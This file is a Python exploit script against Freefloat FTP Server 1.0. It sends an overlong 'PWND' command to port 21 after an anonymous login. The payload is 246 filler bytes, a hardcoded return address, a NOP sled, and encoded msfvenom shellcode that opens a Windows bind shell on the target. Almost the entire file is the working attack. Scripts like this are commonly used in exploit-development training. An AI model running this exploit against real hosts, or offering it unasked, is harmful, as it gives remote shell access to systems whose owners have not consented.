import socket,argparse,time,struct,sys

def main():
    parser=argparse.ArgumentParser(description='Usage: python '+sys.argv[0]+' -H <target Addr>')
    parser.add_argument('-H',dest='target',required=True,help='Specify the FTP ip address')
    args=parser.parse_args()

    tgtHost=args.target

    # msfvenom -p windows/shell_bind_tcp -a x86 --platform windows -e x86/shikata_ga_nai -b '\x00\xff\x0d\x0a\x3d\x20' -f python -i 3 -v shellCode
    
    shellCode =  ""
    shellCode += "\xdb\xcf\xd9\x74\x24\xf4\xbe\x16\x97\x31\x0f\x5b"
    shellCode += "\x33\xc9\xb1\x60\x83\xeb\xfc\x31\x73\x15\x03\x73"
    shellCode += "\x15\xf4\x62\x8b\x09\xd1\x6b\x65\xce\xf8\xad\x02"
    shellCode += "\xd5\x0e\x12\xc2\xdc\x5f\xf4\x25\x88\x8a\x84\x81"
    shellCode += "\x32\xb7\xdd\x1c\xd9\x44\x12\x2c\x4d\x25\xf2\x18"
    shellCode += "\xb1\x93\x87\x8f\xa5\x8f\x27\x2c\x77\x90\x5f\x2a"
    shellCode += "\xca\xf2\xcf\x32\x15\xed\x09\xdd\x6f\x6f\x33\xed"
    shellCode += "\xcc\x6e\x61\x9d\x5c\xf5\xbe\x56\x3b\x5d\x0b\x7c"
    shellCode += "\xc1\x0c\x80\x89\x5d\xac\x25\x18\x81\xc4\x15\x77"
    shellCode += "\x81\xf7\x82\xda\x9a\xda\x6e\xed\xf2\x2d\xb7\x87"
    shellCode += "\x8b\x9d\x2d\xcd\x38\x54\x9f\xe8\x93\x10\xa8\xce"
    shellCode += "\x87\xa4\x05\x58\x95\xc9\x08\xc4\xaa\x14\xec\xcf"
    shellCode += "\x24\xf8\xa1\x3a\xdf\x77\x80\xa4\xbf\xdc\x34\xbf"
    shellCode += "\x8b\x61\xb3\x4f\xbb\x43\x28\x1a\x6e\xf1\x11\x8a"
    shellCode += "\xb3\xb5\x30\x83\x12\xf8\xaf\xad\xf5\xc6\xcd\xcd"
    shellCode += "\x69\x65\x3a\x0f\xe9\xdc\x49\x3c\x22\x0f\x46\x38"
    shellCode += "\x6d\x5d\x45\x9a\x9b\xe6\xe9\x2c\x16\xd8\x05\xa4"
    shellCode += "\x2a\xa8\xab\x83\xbb\xd4\xf4\x86\x6a\xe3\x55\x7a"
    shellCode += "\x57\x1a\x66\xd4\xe7\xd9\xc9\xef\xc6\x9f\x0b\x47"
    shellCode += "\xf1\xdc\x2f\x25\x49\xb5\x15\xf8\x99\x24\x0b\x4d"
    shellCode += "\xdb\xb4\x49\x73\xb8\x27\x70\x14\x6e\x73\x80\x3c"
    shellCode += "\x27\x52\x79\x8c\x45\x97\x1a\xa3\x7d\x4c\xbe\xaa"
    shellCode += "\x27\xe6\x6a\x36\x4b\x14\xfb\x24\x15\xad\x39\x37"
    shellCode += "\x53\x49\xe3\x64\xa5\x8e\x7a\x3b\xa6\xe1\x5d\xf5"
    shellCode += "\x6b\x94\xb3\x85\xbe\x74\x23\xcd\x75\x8b\xd9\x22"
    shellCode += "\x86\x5e\xf2\x9f\x9a\xbe\xc7\x1d\x9c\x04\xd9\xc7"
    shellCode += "\x13\x0e\x7e\xdf\x91\x64\x31\xd6\x63\xb1\xde\xfd"
    shellCode += "\x7b\xa5\x5c\x13\xd4\xfc\x54\xe0\x7c\x30\xf9\x08"
    shellCode += "\xd3\x2e\xb4\xbf\xa7\x48\x7c\x44\xaa\x22\x11\xbd"
    shellCode += "\xf9\x72\x6e\x2c\x6c\x3e\x07\xe5\x75\x6e\x3b\x7b"
    shellCode += "\xc0\xcc\xd2\x45\x37\x50\x88\x24\x68\xd9\xea\x6e"
    shellCode += "\xd3\x5e\xc6\x8c\x24\xca\x4b\x6b\xd5\x31\x3a\x30"
    shellCode += "\x84\x5c\x0c\x94\xc6\x72\x66\x1b\xdb\xf7\xe6\xfd"
    shellCode += "\xed\xb0\xfb\x41\x6c\xa2\xcd\xcc\xe0\x73\x83\xfe"
    shellCode += "\xb5"

    ret= struct.pack('<L',0x7C874413)
    padding ='\x90' *150
    crash= '\x41'*246 +ret+padding+shellCode
    print('[*] Freefloat FTP 1.0 Command Buffer Overflow')
    print('[*] Connecting to '+ tgtHost)
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        s.connect((tgtHost,21))
    except:
        print('[-] Connection to '+ tgtHost+' failed!')
        sys.exit(0)
        exit(0)
    print('[*] Sending '+str(len(crash))+' byte crash')
    s.send('USER anonymous\r\n')
    s.recv(1024)
    s.send('PWND '+crash+'\r\n')
    time.sleep(4)

if __name__=="__main__":
    main()
